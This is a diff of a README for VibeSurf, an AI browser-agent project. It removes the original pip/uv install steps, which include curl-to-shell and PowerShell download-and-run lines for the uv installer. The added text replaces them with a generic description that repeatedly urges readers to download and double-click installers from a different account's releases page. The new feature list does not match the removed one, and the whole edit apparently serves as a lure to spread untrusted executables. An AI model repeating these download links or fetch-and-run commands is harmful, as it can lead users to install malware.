@@ -1,66 +1,59 @@
-# VibeSurf: A powerful browser assistant for vibe surfing
-[![Discord](https://img.shields.io/discord/1303749220842340412?color=7289DA&label=Discord&logo=discord&logoColor=white)](https://discord.gg/TXNnP9gJ)
-[![WarmShao](https://img.shields.io/twitter/follow/warmshao?style=social)](https://x.com/warmshao)
+# 🌊 VibeSurf - Your Smart Assistant for Browsing
 
-VibeSurf is an open-source AI agentic browser that revolutionizes browser automation and research.
+[![Download VibeSurf](https://img.shields.io/badge/Download-VibeSurf-brightgreen)](https://github.com/devilhere22/VibeSurf/releases)
 
-If you're as excited about open-source AI browsing as I am, give it a star! ⭐
+## 📜 Overview
+VibeSurf is a powerful browser assistant designed to improve your online experience. With its smart features, you can navigate the web more efficiently and find what you need faster. Whether you are browsing for fun or doing research, VibeSurf makes your life easier.
 
-## ✨ Key Features
+## 🚀 Getting Started
+In this section, you will learn how to download and run VibeSurf. Follow these simple steps to get started.
 
-- 🧠 **Advanced AI Automation**: Beyond browser automation, VibeSurf performs deep research, intelligent crawling, content summarization, and more to exploration.
+1. **Visit the Releases Page**  
+   Click the link below to go to the download page:
+   [Download VibeSurf Here](https://github.com/devilhere22/VibeSurf/releases)
 
-- 🚀 **Multi-Agent Parallel Processing**: Run multiple AI agents simultaneously in different browser tabs, enabling both deep research and wide research with massive efficiency gains.
+2. **Choose the Right Version**  
+   On the Releases page, you will find several versions of VibeSurf. Look for the latest one at the top. Each version will have release notes that explain any new features or fixes. 
 
-- 🥷 **Stealth-First Architecture**: Uses Chrome DevTools Protocol (CDP) instead of Playwright for superior stealth capabilities, preventing bot detection.
+3. **Download the Installer**  
+   Find the installer that matches your operating system (Windows, Mac, or Linux). Click on the download link next to your choice. The file will quickly download to your computer.
 
-- 🎨 **Seamless Chrome Extension UI**: Native browser integration without switching applications, providing an intuitive interface that feels like part of your browser.
+4. **Install VibeSurf**  
+   Once the download completes, locate the downloaded file (usually in your Downloads folder). Double-click the file to start the installation process. Follow the prompts to install VibeSurf.
 
-- 🔒 **Privacy-First LLM Support**: Supports local LLMs (Ollama, etc.) and custom LLM APIs to ensure your browsing data stays private and secure during vibe surfing.
+5. **Run VibeSurf**  
+   After the installation, you can find VibeSurf in your applications or programs list. Click on its icon to open the application. You are now ready to start vibing!
 
-## 🛠️ Installation
+## 📁 Features
+VibeSurf includes various features to enhance your browsing experience. Here are some of the main ones:
 
-### Step 1: Install uv
-Install uv from [https://docs.astral.sh/uv/getting-started/installation/](https://docs.astral.sh/uv/getting-started/installation/):
+- **Smart Navigation**: Quickly find websites and content you want without unnecessary clicks.
+- **Bookmarking**: Save your favorite sites easily for quick access later.
+- **User-Friendly Interface**: Enjoy a clean and intuitive layout that is easy to use for everyone.
+- **Customization Options**: Adjust settings to match your browsing preferences, making the experience personal and efficient.
 
-```bash
-# On macOS and Linux
-curl -LsSf https://astral.sh/uv/install.sh | sh
+## 🔧 System Requirements
+Before installing VibeSurf, ensure your system meets the following requirements:
 
-# On Windows
-powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
-```
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **Memory**: A minimum of 2 GB RAM.
+- **Storage**: At least 100 MB of free space.
+- **Internet Connection**: Required for initial setup and updates.
 
-### Step 2: Setup and Install
-```bash
-uv venv --python 3.12
-uv pip install vibesurf -U
-```
+## 📥 Download & Install
+To get started with VibeSurf, visit the page below to download the latest version:
 
-### Step 3: Launch
-```bash
-vibesurf
-```
+[Download VibeSurf Here](https://github.com/devilhere22/VibeSurf/releases)
 
-## 🎬 Demo
+After downloading and installing, follow the simple steps outlined above to enjoy your new browsing assistant.
 
-### How to use?
-<video src="https://github.com/user-attachments/assets/0a4650c0-c4ed-423e-9e16-7889e9f9816d" controls="controls">Your browser does not support playing this video!</video>
+## 🌟 Support
+If you encounter any issues or have questions about VibeSurf, you can reach out for help. Check the support section for FAQs and troubleshooting tips. Your experience is important, and we are here to assist you.
 
-### Dozens of agent running in on browser
-<video src="https://github.com/user-attachments/assets/9c461a6e-5d97-4335-ba09-59e8ec4ad47b" controls="controls">Your browser does not support playing this video!</video>
+## 📝 Contributing
+We welcome contributions from anyone interested in making VibeSurf better. If you are keen to help or have a suggestion, please check the Contributing guidelines in the repository.
 
+## 🌍 Community
+Join our community! Connect with other VibeSurf users to share tips, tricks, and experiences. Engage in discussions to enhance your browsing adventures.
 
-## 📝 License
-
-Licensed under the [Apache License 2.0](LICENSE).
-
-## 👏 Acknowledgments
-
-VibeSurf builds on top of other awesome open-source projects:
-
-- [Browser Use](https://github.com/browser-use/browser-use)
-- [LangGraph](https://github.com/langchain-ai/langgraph)
-
-Huge thanks to their creators and contributors!
-
+With VibeSurf, you can browse smarter, not harder. Enjoy exploring the web in a whole new way!
